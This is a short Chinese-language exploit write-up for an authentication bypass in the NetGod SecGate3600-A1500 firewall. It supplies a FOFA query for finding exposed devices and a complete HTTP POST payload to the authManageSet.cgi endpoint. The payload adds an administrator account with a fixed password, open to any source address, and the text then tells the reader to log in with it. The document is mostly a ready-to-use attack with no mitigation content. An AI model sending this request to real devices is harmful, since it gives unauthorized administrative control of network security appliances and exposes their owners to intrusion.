# 网神SecGate3600未授权添加用户漏洞

网神SecGate3600-A1500会话鉴权逻辑存在问题导致，登录绕过获取管理员权限。

## fofa

```yaml
"sec_gate_image/button_normal.gif"
```

## poc

```java
POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 93
Connection: close

type=saveAdmin&id=2&userName=audit&pwd=audit@1234&net=0.0.0.0&mask=0.0.0.0&port=ANY&allow=Y
```

![image-20240803125438422](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408031254480.png)

使用添加的用户登录

![image-20240803125457727](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408031254792.png)